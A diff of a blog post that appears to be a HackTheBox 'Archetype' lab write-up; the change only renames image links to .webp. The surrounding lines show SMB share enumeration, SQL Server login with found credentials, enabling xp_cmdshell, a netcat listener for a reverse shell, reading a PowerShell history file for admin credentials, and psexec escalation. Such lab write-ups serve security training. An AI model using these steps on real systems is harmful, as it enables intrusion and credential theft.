@@ -5,11 +5,11 @@ summary: This is the summary for an awesome post.
 tags: hackthebox, writeup
 
 ## Overview
-![writeup.metadata.infocard](/static/files/posts_htb_archetype/infocard.png)
+![writeup.metadata.infocard](/static/files/posts_htb_archetype/infocard.png.webp)
 
 This is a writeup for HTB VM [Archetype](https://www.hackthebox.eu/home/start). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_htb_archetype/killchain.png)
+![writeup.overview.killchain](/static/files/posts_htb_archetype/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -108,18 +108,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 smbclient -N -L \\\\10.10.10.27
 ```
 
-![writeup.enumeration.steps.2.1](/static/files/posts_htb_archetype/screenshot01.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_htb_archetype/screenshot01.png.webp)  
 
 3\. We find a non-default share named `backups` which seems interesting. Let's explore further:  
 ```
 smbclient -N \\\\10.10.10.27\\backups
 ```
 
-![writeup.enumeration.steps.3.1](/static/files/posts_htb_archetype/screenshot02.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_htb_archetype/screenshot02.png.webp)  
 
 4\. We find a `prod.dtsConfig` file on the SMB share. The `.dtsConfig` files are used by [SQL Server Integration Services (SSIS)](https://en.wikipedia.org/wiki/SQL_Server_Integration_Services). We find that this file contains plaintext credentials for the default SQL service user:  
 
-![writeup.enumeration.steps.4.1](/static/files/posts_htb_archetype/screenshot03.png)  
+![writeup.enumeration.steps.4.1](/static/files/posts_htb_archetype/screenshot03.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -152,7 +152,7 @@ sql: sql_svc
 mssqlclient.py -windows-auth "sql_svc@10.10.10.27"
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_htb_archetype/screenshot04.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_htb_archetype/screenshot04.png.webp)  
 
 2\. We find that the user has `sysadmin` access (highest access level on SQL server) using the `IS_SRVROLEMEMBER` function. This allows us to enable `xp_cmdshell` to gain command execution:  
 ```
@@ -170,7 +170,7 @@ reconfigure;
 xp_cmdshell "whoami"
 ```
 
-![writeup.exploitation.steps.3.1](/static/files/posts_htb_archetype/screenshot05.png)  
+![writeup.exploitation.steps.3.1](/static/files/posts_htb_archetype/screenshot05.png.webp)  
 
 4\. Let's deploy a Powershell reverse shell on the system using `xp_cmdshell` to gain interactive access on the system:  
 ```
@@ -181,20 +181,20 @@ ufw allow from 10.10.10.27 proto tcp to any port 80,443
 nc -nlvp 443
 ```
 
-![writeup.exploitation.steps.4.1](/static/files/posts_htb_archetype/screenshot06.png)  
+![writeup.exploitation.steps.4.1](/static/files/posts_htb_archetype/screenshot06.png.webp)  
 
-![writeup.exploitation.steps.4.2](/static/files/posts_htb_archetype/screenshot07.png)  
+![writeup.exploitation.steps.4.2](/static/files/posts_htb_archetype/screenshot07.png.webp)  
 
-![writeup.exploitation.steps.4.3](/static/files/posts_htb_archetype/screenshot08.png)  
+![writeup.exploitation.steps.4.3](/static/files/posts_htb_archetype/screenshot08.png.webp)  
 
-![writeup.exploitation.steps.4.4](/static/files/posts_htb_archetype/screenshot09.png)  
+![writeup.exploitation.steps.4.4](/static/files/posts_htb_archetype/screenshot09.png.webp)  
 
 5\. We can now read the `user.txt` flag:  
 ```
 type C:\Users\sql_svc\Desktop\user.txt
 ```
 
-![writeup.exploitation.steps.5.1](/static/files/posts_htb_archetype/screenshot10.png)  
+![writeup.exploitation.steps.5.1](/static/files/posts_htb_archetype/screenshot10.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -229,21 +229,21 @@ Administrator
 type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-![writeup.privesc.steps.1.1](/static/files/posts_htb_archetype/screenshot11.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_htb_archetype/screenshot11.png.webp)  
 
 2\. We find that the `backups` drive has been mounted using administrative privileges and the credentials are leaked in plaintext within the history file. We can use these credentials to gain elevated access on the system:  
 ```
 psexec.py administrator@10.10.10.27
 ```
 
-![writeup.privesc.steps.2.1](/static/files/posts_htb_archetype/screenshot12.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_htb_archetype/screenshot12.png.webp)  
 
 3\. We can now read the `root.txt` flag:  
 ```
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-![writeup.privesc.steps.3.1](/static/files/posts_htb_archetype/screenshot13.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_htb_archetype/screenshot13.png.webp)  
 
 ## Loot
 ### Credentials
